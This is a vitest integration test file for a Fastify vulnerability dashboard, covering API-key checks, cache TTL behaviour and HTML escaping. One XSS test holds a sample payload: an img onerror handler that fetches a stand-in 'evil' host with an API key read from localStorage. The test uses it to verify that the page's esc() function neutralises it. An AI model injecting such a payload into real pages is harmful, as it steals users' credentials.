import { describe, it, expect, afterAll, afterEach, beforeAll, vi } from 'vitest';
import type { FastifyInstance } from 'fastify';
import { createServer } from '../server.js';
import { prisma } from '../../db/client.js';
import { ECOSYSTEM_COUNTS_CACHE_TTL_MS } from './dashboard.js';

const API_KEY = 'test-api-key'; // matches vitest.integration.config.ts

describe('dashboard', () => {
  let app: FastifyInstance;

  beforeAll(async () => {
    app = await createServer();
  });

  afterAll(async () => {
    await app.close();
  });

  describe('GET /api/v1/import-status', () => {
    const get = (headers: Record<string, string> = {}) =>
      app.inject({ method: 'GET', url: '/api/v1/import-status', headers });

    it('rejects a request with no API key', async () => {
      expect((await get()).statusCode).toBe(401);
    });

    it('rejects a wrong API key', async () => {
      expect((await get({ 'x-api-key': 'wrong' })).statusCode).toBe(401);
    });

    it('rejects a duplicated header, which arrives as an array rather than a string', async () => {
      const res = await app.inject({
        method: 'GET',
        url: '/api/v1/import-status',
        headers: { 'x-api-key': [API_KEY, 'wrong'] as unknown as string },
      });
      expect(res.statusCode).toBe(401);
    });

    it('accepts the configured API key', async () => {
      expect((await get({ 'x-api-key': API_KEY })).statusCode).toBe(200);
    });

    describe('per-ecosystem count caching', () => {
      // The underlying query is a full scan with no selective WHERE clause
      // (COUNT(DISTINCT "vulnerabilityId") GROUP BY ecosystem over the whole
      // table) -- measured at 13.7s against production-scale data even after
      // ANALYZE, 5.7s with a covering index. Re-running it on every 60s
      // dashboard poll bought nothing, since the underlying data only changes
      // once a day, so it's cached for a few minutes. These tests exist to
      // catch a regression to "always fresh" (defeats the point) or "never
      // refreshes" (a stale dashboard forever) without waiting out the real
      // 5-minute TTL.
      const ecosystem = `test-cache-ecosystem-${Date.now()}`;

      async function seedOneVulnerability(suffix: string) {
        const master = await prisma.vulnerability.create({ data: {} });
        const osv = await prisma.oSVVulnerability.create({
          data: { osvId: `GHSA-cache-test-${suffix}`, rawData: {}, masterVulnId: master.id },
        });
        await prisma.oSVAffectedPackage.create({
          data: { vulnerabilityId: osv.id, ecosystem, packageName: 'test-package' },
        });
      }

      const countFor = (body: { osvEcosystems: Array<{ ecosystem: string; recordCount: number }> }) =>
        body.osvEcosystems.find(e => e.ecosystem === ecosystem)?.recordCount ?? 0;

      afterEach(async () => {
        vi.useRealTimers();
        await prisma.oSVAffectedPackage.deleteMany({ where: { ecosystem } });
        await prisma.oSVVulnerability.deleteMany({ where: { osvId: { startsWith: 'GHSA-cache-test-' } } });
      });

      // The cache is a module-level singleton, so an earlier test in this
      // file may have already warmed it against real time. Faking Date and
      // jumping forward from "now" by more than the TTL guarantees the next
      // call is a genuine miss regardless of what any prior test left behind.
      function forceCacheMiss() {
        vi.useFakeTimers({ toFake: ['Date'] });
        vi.setSystemTime(Date.now() + ECOSYSTEM_COUNTS_CACHE_TTL_MS + 1);
      }

      it('does not reflect a DB change made within the cache TTL', async () => {
        forceCacheMiss();
        await seedOneVulnerability('a');
        const first = (await get({ 'x-api-key': API_KEY })).json();
        expect(countFor(first)).toBe(1);

        await seedOneVulnerability('b');
        const second = (await get({ 'x-api-key': API_KEY })).json();
        expect(countFor(second)).toBe(1); // still cached, not 2
      });

      it('refreshes once the cache TTL has elapsed', async () => {
        forceCacheMiss();
        await seedOneVulnerability('c');
        const before = (await get({ 'x-api-key': API_KEY })).json();
        expect(countFor(before)).toBe(1);

        await seedOneVulnerability('d');
        vi.setSystemTime(Date.now() + ECOSYSTEM_COUNTS_CACHE_TTL_MS + 1);

        const after = (await get({ 'x-api-key': API_KEY })).json();
        expect(countFor(after)).toBe(2);
      });
    });
  });

  describe('GET /dashboard', () => {
    it('serves the HTML shell without an API key', async () => {
      const res = await app.inject({ method: 'GET', url: '/dashboard' });
      expect(res.statusCode).toBe(200);
      expect(res.headers['content-type']).toContain('text/html');
    });

    it('escapes values that reach innerHTML', async () => {
      // The dashboard renders values it does not control: OSV ecosystem names
      // come from upstream data, and errorMessage is whatever a failing fetcher
      // produced. Both are interpolated into innerHTML, and the API key lives
      // in localStorage, so an injected script would be able to read it.
      // esc() is defined inside the page's own <script>, so this exercises the
      // shipped implementation rather than a copy of it.
      const html = (await app.inject({ method: 'GET', url: '/dashboard' })).body;
      const escSource = html.match(/function esc\(v\) \{[\s\S]*?\n {4}\}/)?.[0];
      expect(escSource, 'esc() must exist in the served page').toBeDefined();

      const esc = new Function(`${escSource}; return esc;`)() as (v: unknown) => string;
      const payload = `<img src=x onerror="fetch('//evil/'+localStorage.getItem('heretix_api_key'))">`;
      const escaped = esc(payload);

      expect(escaped).not.toMatch(/[<>]/);
      expect(escaped).not.toMatch(/["']/);
      expect(esc(null)).toBe('');
    });

    it('does not build click handlers by interpolating data into onclick attributes', async () => {
      // Job sources are interpolated into the action buttons; inside an
      // onclick they would sit in an HTML-attribute *and* a JS-string context
      // at once. Data attributes plus delegation leave only the former.
      const html = (await app.inject({ method: 'GET', url: '/dashboard' })).body;
      expect(html).not.toMatch(/onclick="runJob/);
      expect(html).not.toMatch(/onclick="toggleJob/);
      expect(html).toContain('data-action="run"');
      expect(html).toContain('data-action="toggle"');
    });
  });
});
